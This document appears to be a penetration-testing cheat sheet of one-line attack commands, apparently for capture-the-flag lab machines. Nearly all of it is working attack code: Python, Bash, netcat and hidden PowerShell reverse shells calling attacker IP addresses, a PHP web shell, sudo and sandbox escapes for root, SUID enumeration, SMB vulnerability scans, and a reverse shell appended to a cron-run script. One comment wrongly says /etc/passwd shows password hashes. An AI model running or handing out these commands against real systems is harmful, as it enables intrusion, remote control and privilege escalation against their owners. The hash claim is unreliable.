# Python Shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#used to gain root access in some systems.
```
sudo python3.5 -c ‘import os; os.system(“/bin/sh”)’
```
#command used to open up a reverse shell from the browser.
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.137",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```
python escape characters:
```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
```
#can be used to find real host name.
```
curl -H 'Host: http://172.16.226.6' "http://172.16.226.6/'"
```
to exploit a cronjob
https://gtfobins.github.io/gtfobins/tar/

Shows the password hashes on a linux system
```
cat /etc/passwd
```
Shows the groups on a linux system
```
cat /etc/group
```
```
ls -lh /var/mail/
```
```
dpkg -l
```
Check for Suid binaries
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
```
 find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```
Lists capabilities of binaries
```
getcap -r /
```
Shows user group files
```
find / -type f -group users 2>/dev/null
```
Simple php shell:
```
<?php system($_GET['0xdf']); ?>
```
ssh tunnel:
```
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```
list processes and open ports:
```
ps -aux

netstat -an
```
To escape rbash:
```
ssh mindy@10.10.10.51 -t bash
```
```
nmap --script smb-vuln* -p 445 10.10.10.4
```
```
ls /usr/share/nmap/scripts/ | grep smb | grep vuln
```
Bash Reverse Shell:
```
bash -c 'bash -i >& /dev/tcp/192.168.45.5/1234 0>&1'
```
Install searchsploit on parrotOS.
```
sudo apt install exploitdb -y
```
Powershell Reverse Shell:
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
reverse shell for exploitation of a vulnerable file.
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 8443 >/tmp/f' | tee -a monitor.sh
```
